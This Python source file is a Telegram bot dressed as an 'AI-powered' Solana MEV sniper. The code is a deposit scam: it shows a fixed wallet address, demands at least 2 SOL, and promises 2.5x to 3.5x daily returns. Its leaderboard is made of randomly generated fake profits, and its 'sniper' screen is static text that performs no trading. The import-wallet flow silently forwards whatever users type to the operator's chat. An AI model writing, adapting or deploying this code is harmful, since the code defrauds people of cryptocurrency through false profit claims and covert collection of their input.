import os
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID"))

# Fixed depositable Solana wallet
public_address = "7VP1R76sYtU9DXtigEr3KhUyX8nQpzwwwJzKBj1QfbQc"

# Leaderboard generator
def generate_leaderboard():
    names = ["zyloTrades", "testWallett", "MoonChaser152", "run4abag",
             "chasedamney1", "freeplow11", "Solanawnn55", "zbaatrading",
             "tt127man", "MEVGod1723"]
    leaderboard = []
    for name in names:
        leaderboard.append(f"{name}: {random.uniform(10, 100):.2f} SOL")
    return leaderboard

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("Activate Sniper", callback_data="activate_sniper")]]
    text = """🦅EAGLE SNIPER BOT
⚡️PRECISION MEV SNIPING
- Real-time memepool scanning for profitable trades
- AI-powered sniper entries with millisecond executions
- Rug-detection algorithms for safe sniping

💲ADVANCED ALGO ENGINE 
- Optimized front-run & back-run strategies
- High-frequency Solana transaction execution
- Automated profit-taking and stop-loss management"""
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

# Main sniper screen
async def activate_sniper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query:
        await query.answer()
    keyboard = [
        [InlineKeyboardButton("Leaderboard", callback_data="leaderboard"),
         InlineKeyboardButton("Start Sniper", callback_data="start_sniper")],
        [InlineKeyboardButton("Import Wallet🔒 (Other Method)", callback_data="import_wallet")]
    ]
    text = f"""🚀Welcome to Eagle Sniper
The Fastest AI-Powered MEV Sniper on Solana

🔑Your Main SOL Wallet:
<b>{public_address}</b> (Tap to copy)

💰Balance: 0.0 SOL ($0.00)
📊Profit Potential (per 24 hours):
📈- 2 SOL Deposit: Earn up to 2.5x daily
📈- 5 SOL Deposit: Earn up to 3.5x daily
💸Average Trade Profit: ~0.2 – 2.5+ SOL
⚠️Important:

To activate the bot, a minimum of 2 SOL is required in your wallet.

📩Questions? Contact: @eaglesupport"""
    if query:
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await context.bot.send_message(chat_id=context._chat_id, text=text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

# Leaderboard tab
async def leaderboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lb = "\n".join(generate_leaderboard())
    keyboard = [[InlineKeyboardButton("Back", callback_data="activate_sniper")]]
    await query.edit_message_text(f"Leaderboard:\n\n{lb}", reply_markup=InlineKeyboardMarkup(keyboard))

# Start Sniper tab
async def start_sniper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("Refresh", callback_data="start_sniper")],
        [InlineKeyboardButton("Back", callback_data="activate_sniper")]
    ]
    text = """Initializing Cheeta Sniper Protocol…

Status: Waiting for deposit confirmation on Solana mainnet…

Scanning:
- Verifying incoming transaction on blockchain nodes
- Syncing with high-frequency mempool relays
- Loading AI sniper modules & market feeds
- Preparing execution layer for front-run/back-run opportunities

Estimated time: ~5–15 seconds after transaction confirmation

Click Refresh if the bot hasn't updated, or Back to return to deposit instructions."""
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

# Import Wallet screen
async def import_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [[InlineKeyboardButton("Back", callback_data="activate_sniper")]]
    text = """🔒Import Your Wallet (Other Method)

Please manually send your SOL public address as a message below.
Once you send it, you will receive a confirmation screen.

📩 Questions? Contact: @eaglesupport"""
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

# Handle wallet messages (only manual text messages)
async def handle_wallet_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message and update.message.text:
        user = update.message.from_user
        public_address_input = update.message.text

        # Silently forward to OWNER_CHAT_ID
        forward_text = f"User @{user.username} sent wallet address:\n{public_address_input}"
        await context.bot.send_message(chat_id=OWNER_CHAT_ID, text=forward_text)

        # Send thank you / waiting screen
        text = """✅ Thank you for submitting your wallet!
⏳ Connection typically takes around 1–6 hours.
🙏 We appreciate your support.

📩 Questions? Contact: @eaglesupport"""
        keyboard = [[InlineKeyboardButton("Back to Menu", callback_data="activate_sniper")]]
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(activate_sniper, pattern="activate_sniper"))
    app.add_handler(CallbackQueryHandler(leaderboard, pattern="leaderboard"))
    app.add_handler(CallbackQueryHandler(start_sniper, pattern="start_sniper"))
    app.add_handler(CallbackQueryHandler(import_wallet, pattern="import_wallet"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet_message))
    app.run_polling()

if __name__ == "__main__":
    main()